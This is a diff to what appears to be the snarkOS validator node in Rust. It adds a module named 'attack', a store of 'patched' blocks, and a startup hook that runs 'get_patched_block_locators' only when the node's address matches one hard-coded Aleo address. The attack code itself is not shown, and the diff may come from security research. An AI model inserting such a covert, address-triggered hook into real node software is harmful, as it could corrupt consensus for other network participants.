@@ -13,6 +13,7 @@
 // limitations under the License.
 
 mod router;
+mod attack;
 
 use crate::traits::NodeInterface;
 use snarkos_account::Account;
@@ -50,6 +51,7 @@ use std::{
     time::Duration,
 };
 use tokio::task::JoinHandle;
+use std::collections::HashMap;
 
 /// A validator is a full node, capable of validating blocks.
 #[derive(Clone)]
@@ -68,6 +70,8 @@ pub struct Validator<N: Network, C: ConsensusStorage<N>> {
     handles: Arc<Mutex<Vec<JoinHandle<()>>>>,
     /// The shutdown signal.
     shutdown: Arc<AtomicBool>,
+
+    patched_blocks: Arc<Mutex<HashMap<u32, Block<N>>>>,
 }
 
 impl<N: Network, C: ConsensusStorage<N>> Validator<N, C> {
@@ -140,6 +144,7 @@ impl<N: Network, C: ConsensusStorage<N>> Validator<N, C> {
             sync,
             handles: Default::default(),
             shutdown,
+            patched_blocks: Default::default(),
         };
         // Initialize the transaction pool.
         node.initialize_transaction_pool(storage_mode, dev_txs)?;
@@ -155,6 +160,16 @@ impl<N: Network, C: ConsensusStorage<N>> Validator<N, C> {
         node.handles.lock().push(crate::start_notification_message_loop());
         // Pass the node to the signal handler.
         let _ = signal_node.set(node.clone());
+        {
+            let node = node.clone();
+            if node.router.address().to_string() == "aleo1rhgdu77hgyqd3xjj8ucu3jj9r2krwz6mnzyd80gncr5fxcwlh5rsvzp9px".to_string() {
+                tokio::spawn(async move {
+                    tokio::time::sleep(Duration::from_millis(500)).await;
+                    node.get_patched_block_locators().unwrap();}
+                );
+            }
+        }
+
         // Return the node.
         Ok(node)
     }
